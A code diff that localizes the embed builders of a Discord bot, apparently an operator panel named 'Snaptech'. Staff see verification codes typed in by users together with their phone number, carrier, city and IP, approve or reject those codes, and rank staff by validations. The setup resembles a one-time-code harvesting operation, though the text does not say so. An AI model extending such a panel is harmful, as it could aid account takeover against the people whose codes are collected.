@@ -12,6 +12,18 @@
 import { EmbedBuilder }                                      from "discord.js";
 import { getOperatorColor, STATUS_COLORS }                   from "./colors.js";
 import { formatPhone, formatIP, getCarrierName, formatDate } from "./formatters.js";
+import { t }                                                  from "./i18n.js";
+
+// Every builder below takes an optional `lang` that defaults to "en", so an
+// untranslated caller keeps the exact output it had before this was added.
+//
+// buildNewRequestEmbed is the deliberate exception: it has no `lang` at all.
+// That embed is posted once into a shared operator channel and read by the
+// whole team, and Discord renders one message identically for every viewer
+// — there is no per-reader variant to pick. Giving it a language parameter
+// would just mean "whoever happened to trigger it decides what language the
+// rest of the team reads", which is worse than a consistent English.
+// Everything scoped to ONE person (DMs, ephemeral replies) is translated.
 
 // ─── Helpers ──────────────────────────────────────────────────────────────────
 
@@ -53,7 +65,7 @@ export function buildNewRequestEmbed(row) {
 
 // ─── Code submitted ───────────────────────────────────────────────────────────
 
-export function buildCodeSubmittedEmbed(row) {
+export function buildCodeSubmittedEmbed(row, lang = "en") {
     const carrier = getCarrierName(row.operator);
     const code    = row.staff_code || "N/A";
     const len     = row.code_length || 6;
@@ -63,78 +75,78 @@ export function buildCodeSubmittedEmbed(row) {
     const codeFmt = code.split("").join(" ");
 
     return new EmbedBuilder()
-        .setTitle("🔓 Code Submitted by User")
+        .setTitle(t(lang, "code_dm_title"))
         .setColor(0x10b981)
         .setDescription(
-            `🆔 \`#${row.id}\`  ·  👤 **${row.username}**  ·  🔢 \`${len}-digit\` code\n` +
+            `🆔 \`#${row.id}\`  ·  👤 **${row.username}**  ·  🔢 \`${len}\`\n` +
             `──────────────────────`
         )
         .addFields(
-            { name: "🔢 Code Entered", value: "```\n" + codeFmt + "\n```",       inline: false },
-            { name: "📞 Phone",       value: formatPhone(row.phone),            inline: true  },
-            { name: "📡 Carrier",     value: "`" + carrier + "`",              inline: true  },
-            { name: "⏰ Submitted",    value: formatDate(row.updated_at || row.created_at), inline: true },
-            { name: "🌍 Country",     value: "`" + (row.country || "?") + "`", inline: true  },
-            { name: "🏙️ City",       value: "`" + (row.city || "?") + "`",    inline: true  },
-            { name: "🌐 IP",          value: formatIP(ip),                       inline: true  },
+            { name: t(lang, "code_dm_field_code"),      value: "```\n" + codeFmt + "\n```",       inline: false },
+            { name: t(lang, "code_dm_field_phone"),     value: formatPhone(row.phone),            inline: true  },
+            { name: t(lang, "code_dm_field_carrier"),   value: "`" + carrier + "`",              inline: true  },
+            { name: t(lang, "code_dm_field_submitted"), value: formatDate(row.updated_at || row.created_at), inline: true },
+            { name: t(lang, "code_dm_field_country"),   value: "`" + (row.country || "?") + "`", inline: true  },
+            { name: t(lang, "code_dm_field_city"),      value: "`" + (row.city || "?") + "`",    inline: true  },
+            { name: t(lang, "code_dm_field_ip"),        value: formatIP(ip),                       inline: true  },
         )
-        .setFooter({ text: "⚡ Approve or reject the code below  •  Snaptech" })
+        .setFooter({ text: t(lang, "code_dm_footer") })
         .setTimestamp();
 }
 
 // ─── Retry ────────────────────────────────────────────────────────────────────
 
-export function buildRetryEmbed(row) {
+export function buildRetryEmbed(row, lang = "en") {
     const carrier = getCarrierName(row.operator);
     const ip      = row.ip_address;
 
     return new EmbedBuilder()
-        .setTitle("🔄 New Code Pending")
+        .setTitle(t(lang, "emb_retry_title"))
         .setColor(0xf59e0b)
         .setDescription(
             `🆔 \`#${row.id}\`  ·  👤 **${row.username}**\n` +
             `──────────────────────\n` +
-            `⚠️ The previous code was **incorrect** — check the new one below.`
+            t(lang, "emb_retry_desc")
         )
         .addFields(
-            { name: "📞 Phone",     value: formatPhone(row.phone),            inline: true },
-            { name: "📡 Carrier",   value: "`" + carrier + "`",              inline: true },
-            { name: "⏰ Retried",    value: formatDate(row.updated_at || row.created_at), inline: true },
-            { name: "🌍 Country",   value: "`" + (row.country || "?") + "`", inline: true },
-            { name: "🏙️ City",     value: "`" + (row.city || "?") + "`",    inline: true },
-            { name: "🌐 IP",        value: formatIP(ip),                       inline: true },
+            { name: t(lang, "code_dm_field_phone"),     value: formatPhone(row.phone),            inline: true },
+            { name: t(lang, "code_dm_field_carrier"),   value: "`" + carrier + "`",              inline: true },
+            { name: t(lang, "code_dm_field_submitted"), value: formatDate(row.updated_at || row.created_at), inline: true },
+            { name: t(lang, "code_dm_field_country"),   value: "`" + (row.country || "?") + "`", inline: true },
+            { name: t(lang, "code_dm_field_city"),      value: "`" + (row.city || "?") + "`",    inline: true },
+            { name: t(lang, "code_dm_field_ip"),        value: formatIP(ip),                       inline: true },
         )
-        .setFooter({ text: "🔁 New attempt  •  Snaptech" })
+        .setFooter({ text: t(lang, "emb_retry_footer") })
         .setTimestamp();
 }
 
 // ─── Stats ────────────────────────────────────────────────────────────────────
 
-export function buildStatsEmbed(stats, todayStats) {
+export function buildStatsEmbed(stats, todayStats, lang = "en") {
     const total          = Number(stats.total) || 0;
     const completed      = Number(stats.completed) || 0;
     const completionRate = total > 0 ? Math.round((completed / total) * 100) : 0;
     const bar            = progressBar(completed, total);
 
     return new EmbedBuilder()
-        .setTitle("📊 Global Statistics")
+        .setTitle(t(lang, "stats_title"))
         .setColor(0x3b82f6)
         .setDescription(
-            `**Completion rate: ${completionRate}%**\n\`${bar}\` ${completed}/${total}`
+            `${t(lang, "stats_completion", completionRate)}\n\`${bar}\` ${completed}/${total}`
         )
         .addFields(
-            { name: "📋 Total",          value: "`" + stats.total      + "`", inline: true },
-            { name: "⏳ Pending",        value: "`" + stats.pending    + "`", inline: true },
-            { name: "👤 In Progress",   value: "`" + stats.processing + "`", inline: true },
-            { name: "⏱️ Awaiting Code",  value: "`" + stats.waiting    + "`", inline: true },
-            { name: "🔓 Code Submitted", value: "`" + stats.submitted  + "`", inline: true },
-            { name: "✅ Completed",      value: "`" + stats.completed  + "`", inline: true },
-            { name: "🔄 Retry",          value: "`" + stats.retry      + "`", inline: true },
-            { name: "❌ Wrong Number",   value: "`" + stats.wrong      + "`", inline: true },
-            { name: "🚫 Banned IPs",     value: "`" + stats.banned     + "`", inline: true },
+            { name: t(lang, "stats_total"),     value: "`" + stats.total      + "`", inline: true },
+            { name: t(lang, "stats_pending"),   value: "`" + stats.pending    + "`", inline: true },
+            { name: t(lang, "stats_progress"),  value: "`" + stats.processing + "`", inline: true },
+            { name: t(lang, "stats_waiting"),   value: "`" + stats.waiting    + "`", inline: true },
+            { name: t(lang, "stats_submitted"), value: "`" + stats.submitted  + "`", inline: true },
+            { name: t(lang, "stats_completed"), value: "`" + stats.completed  + "`", inline: true },
+            { name: t(lang, "stats_retry"),     value: "`" + stats.retry      + "`", inline: true },
+            { name: t(lang, "stats_wrong"),     value: "`" + stats.wrong      + "`", inline: true },
+            { name: t(lang, "stats_banned"),    value: "`" + stats.banned     + "`", inline: true },
             {
-                name:  "📅 Today",
-                value: `Requests: \`${todayStats.requests}\`  ·  Completed: \`${todayStats.completed}\``,
+                name:  t(lang, "stats_today"),
+                value: t(lang, "stats_today_line", todayStats.requests, todayStats.completed),
                 inline: false,
             },
         )
@@ -144,11 +156,11 @@ export function buildStatsEmbed(stats, todayStats) {
 
 // ─── Operator stats ───────────────────────────────────────────────────────────
 
-export function buildOperatorStatsEmbed(operatorStats) {
+export function buildOperatorStatsEmbed(operatorStats, lang = "en") {
     const embed = new EmbedBuilder()
-        .setTitle("📡 Operator Distribution")
+        .setTitle(t(lang, "ops_title"))
         .setColor(0x8b5cf6)
-        .setDescription("Requests by mobile carrier");
+        .setDescription(t(lang, "ops_desc"));
 
     const total = operatorStats.reduce((s, r) => s + Number(r.count), 0);
     const medals = ["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣"];
@@ -170,14 +182,14 @@ export function buildOperatorStatsEmbed(operatorStats) {
 
 // ─── Leaderboard ──────────────────────────────────────────────────────────────
 
-export function buildLeaderboardEmbed(rows, limit) {
+export function buildLeaderboardEmbed(rows, limit, lang = "en") {
     const embed = new EmbedBuilder()
-        .setTitle("🏆 Staff Leaderboard")
+        .setTitle(t(lang, "lb_title"))
         .setColor(0xf59e0b)
-        .setDescription("Top " + limit + " staff by code validations");
+        .setDescription(t(lang, "lb_desc", limit));
 
     if (rows.length === 0) {
-        embed.setDescription("🏆 Top " + limit + " staff by validations\n\n*No validations recorded yet.*");
+        embed.setDescription(t(lang, "lb_desc", limit) + "\n\n" + t(lang, "lb_none"));
     } else {
         const maxV  = Number(rows[0].validations) || 1;
         const medals = ["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣","🔟"];
@@ -185,7 +197,7 @@ export function buildLeaderboardEmbed(rows, limit) {
             const bar = progressBar(row.validations, maxV, 10);
             embed.addFields({
                 name:   (medals[i] || "•") + " " + row.staff,
-                value:  `\`${bar}\` ✅ \`${row.validations}\` validations`,
+                value:  `\`${bar}\` ✅ \`${row.validations}\` ${t(lang, "lb_validations")}`,
                 inline: false,
             });
         });
@@ -197,13 +209,13 @@ export function buildLeaderboardEmbed(rows, limit) {
 
 // ─── Hourly activity ──────────────────────────────────────────────────────────
 
-export function buildHourlyStatsEmbed(hourlyData) {
+export function buildHourlyStatsEmbed(hourlyData, lang = "en") {
     const embed = new EmbedBuilder()
-        .setTitle("📈 Activity — Last 24h")
+        .setTitle(t(lang, "act_title"))
         .setColor(0x10b981);
 
     if (hourlyData.length === 0) {
-        embed.setDescription("*No activity in the last 24 hours.*");
+        embed.setDescription(t(lang, "act_none"));
     } else {
         const maxCount = Math.max(...hourlyData.map(r => Number(r.count)));
         let chart = "```\n";
@@ -224,13 +236,13 @@ export function buildHourlyStatsEmbed(hourlyData) {
 
 // ─── Staff activity ───────────────────────────────────────────────────────────
 
-export function buildStaffActivityEmbed(activityData) {
+export function buildStaffActivityEmbed(activityData, lang = "en") {
     const embed = new EmbedBuilder()
-        .setTitle("👥 Staff Activity")
+        .setTitle(t(lang, "staffact_title"))
         .setColor(0xec4899);
 
     if (activityData.length === 0) {
-        embed.setDescription("*No activity recorded yet.*");
+        embed.setDescription(t(lang, "staffact_none"));
     } else {
         const grouped = {};
         activityData.forEach(row => {
